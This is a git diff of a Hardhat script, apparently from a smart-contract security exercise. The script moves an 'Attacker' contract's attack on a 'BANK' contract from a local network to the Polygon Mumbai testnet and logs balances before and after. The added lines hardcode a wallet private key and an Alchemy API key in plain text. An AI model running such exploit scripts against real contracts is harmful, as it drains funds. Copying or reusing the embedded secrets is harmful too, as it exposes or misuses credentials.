@@ -6,11 +6,13 @@
 // global scope, and execute the script.
 const hre = require("hardhat");
 
-let BANK = "0x1429859428C0aBc9C2C47C8Ee9FBaf82cFA0F20f";
-let ATTACKER = "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266";
-let ATTACKERCONT = "0x922D6956C99E12DFeB3224DEA977D0939758A1Fe";
+let BANK = "0xE6E2EBe4f42A9593E5F857E83621Dd4f37de3C5f";
+let ATTACKER = "0xEaB56c75C3F066901D2c85D8Ba41e5E0Ba734B6D";
+let ATTACKERCONT = "0x13aa127123CfAcE4a360f30BecfCf3Dc4267e6B0";
 let PRIVATEKEY =
-	"0xf2988f8ed77e42527e7b8fc2ee27a3fb5cfe703780f831536d7c9ebb3abb85b9";
+	"0x8d7bf23ad10d0c4d1bdaf9168a7f447bfe9acadba1e7f43f960e30371522fdcf";
+
+let API_KEY = "vZF-bLS5x-6QJAXdpq-LNZ4S2_TZi2_P";
 
 async function main() {
 	//it("Perform Attack", async function () {
@@ -18,7 +20,14 @@ async function main() {
 	// For Hardhat
 	const contract = require("../artifacts/contracts/Attacker.sol/Attacker.json");
 
-	const [owner, addr1] = await ethers.getSigners(); //must use first signer
+	// Provider
+	const alchemyProvider = new ethers.providers.AlchemyProvider(
+		(network = "maticmum"),
+		API_KEY
+	);
+
+	// Signer
+	const owner = new ethers.Wallet(PRIVATEKEY, alchemyProvider);
 
 	// Contract
 	const attackerContract = new ethers.Contract(
@@ -28,7 +37,7 @@ async function main() {
 	);
 
 	console.log(`${owner.address}`);
-	console.log(JSON.stringify(contract.abi));
+	//console.log(JSON.stringify(contract.abi));
 
 	console.log("");
 	console.log("*** Before ***");
@@ -44,7 +53,7 @@ async function main() {
 	);
 
 	await attackerContract.attack({
-		value: ethers.utils.parseEther("1"),
+		value: ethers.utils.parseEther("0.0000311365"),
 	});
 
 	console.log("");
